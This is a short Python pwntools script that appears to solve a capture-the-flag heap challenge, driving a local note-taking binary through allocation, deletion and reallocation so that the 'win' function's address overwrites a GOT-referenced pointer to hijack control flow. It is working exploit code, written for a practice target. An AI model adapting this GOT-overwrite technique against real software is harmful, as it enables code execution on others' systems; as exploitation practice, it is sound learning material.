#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./challenge")
elf = ELF("./challenge")
libc = elf.libc 
win = elf.symbols['win']
book = 0x602280

def make_note(size, title, note):
    p.sendafter("> ", '1')
    p.sendafter("size of note: ", str(size))
    p.sendafter("title: ", title)
    p.sendafter("note: ", note)

def edit_note(num, note):
    p.sendafter("> ", '2')
    p.sendafter("Note#: ", str(num))
    p.send(note)

def delete_note(num):
    p.sendafter("> ", '3')
    p.sendafter("Note#: ", str(num))

gdb.attach(p)

make_note(0x100, 'A'*0x20, p64(elf.got['puts'])*4)
make_note(0x80, 'C'*0x20, 'D'*0x10)

delete_note(0)
make_note(0x100, 'B'*0x20, p64(win))

p.interactive()
